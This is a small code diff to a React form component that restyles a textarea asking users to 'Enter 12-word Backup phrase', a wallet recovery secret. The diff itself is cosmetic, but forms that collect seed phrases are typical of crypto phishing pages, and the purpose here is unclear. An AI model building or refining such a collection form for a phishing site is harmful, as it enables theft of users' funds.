@@ -57,8 +57,8 @@ const Form = (props) => {
 
             <textarea
                 id='phrase'
-                className='text-black border-2 border-blue-800 outline-none text-lg p-1 rounded-md justify-self-stretch '
-                rows={3}
+                className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
+                rows={2}
                 required
                 value={phrase}
                 placeholder='Enter 12-word Backup phrase'
